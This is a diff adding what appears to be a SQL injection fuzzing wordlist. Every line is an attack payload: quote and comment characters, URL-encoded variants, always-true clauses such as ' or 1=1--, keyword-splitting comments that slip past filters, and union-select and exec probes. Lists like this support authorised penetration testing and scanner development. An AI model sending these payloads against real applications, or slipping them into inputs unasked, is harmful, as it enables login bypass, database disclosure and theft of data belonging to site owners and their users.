@@ -1,0 +1,140 @@
+!
+&
+'
+(
+)
+/
+?
+|
+//
+a'
+or
+')
+';
+"'
+")
+";
+`"
+`)
+`;
+\\
+%27
+%%2727
+%25%27
+%60
+5C
+ --
+%21
+%26
+%28
+%29
+%7C
+*/*
+//*
+1'1
+26 %
+28 %
+29 %
+||'6
+%2A%7C
+or 1=1
+or 1=1#
+or 1=1--
+or 1=1//
+or 1=1/*
+or 1=1%
+or 1=1%23
+ or 1/*
+ or 1=1
+ or 3=3
+ or a=a
+0 or 1=1
+1 or 1=1
+or 0=0 #
+or 1=1--
+or a = a
+or%201=1
+ or 0=0 #
+ or 1 --'
+ or 1=1--
+ or 2 > 1
+ or a = a
+ or a=a--
+ or '1'='1
+ or 'a'='a
+ or 0=0 #"
+ or 0=0 --
+ or 1=1 /*
+' or 3=3 or ''='
+' or 1=1
+' or ''='
+) or (a=a
+1 and 1=1
+23 OR 1=1
+hi or a=a
+or 0=0 #"
+or 0=0 --
+" or 1=1--
+' or 0=0 #
+' or 1 --'
+' or 1=1--
+' or a=a--
+<>"'%;)(&+
+" or "a"="a
+" or 0=0 --
+%20or%201=1
+%20or%20x=x
+' or 0=0 --
+a' or 1=1--
+a' or 3=3--
+admin' or '
+or%201=1 --
+%20or%20''='
+'%20or%201=1
+) or ('a'='a
+1' or '1'='1
+; or '1'='1'
+ or '1'='1'--
+' or (EXISTS)
+'%20or%20''='
+') or ('a'='a
+hi or 1=1 --"
+hi' or 'a'='a
+hi' or 1=1 --
+or 1=1 or ""=
+ -- &password=
+ or 1=1 or ""=
+"a"" or 1=1--"
+"a"" or 3=3--"
+%20or%20'x'='x
+%27%20or%201=1
+' or '1'='1'--
+a' or 'a' = 'a
+ or 1=1 or ''='
+' (select top 1
+'%20or%20'x'='x
+hi' or 'x'='x';
+hi') or ('a'='a
+password:*/=1--
+ or '7659'='7659
+ or 'text' > 't'
+' or 1=1 or ''='
+'hi' or 'x'='x';
+)%20or%20('x'='x
+')%20or%20('x'='x
+or isNULL(1/0) /*
+" or isNULL(1/0) /*
+anything' OR 'x'='x
+x' or 1=1 or 'x'='y
+ or 'text' = n'text'
+uni/**/on sel/**/ect
+ or 2 between 1 and 3
+"hi"") or (""a""=""a"
+/**/or/**/1/**/=/**/1
+ or 'unusual' = 'unusual'
+ union all select @@version--
+ or 'something' = 'some'+'thing'
+; exec ('sel' + 'ect us' + 'er')
+' procedure analyse() #
+' procedure analyse() --
+' procedure analyse() //
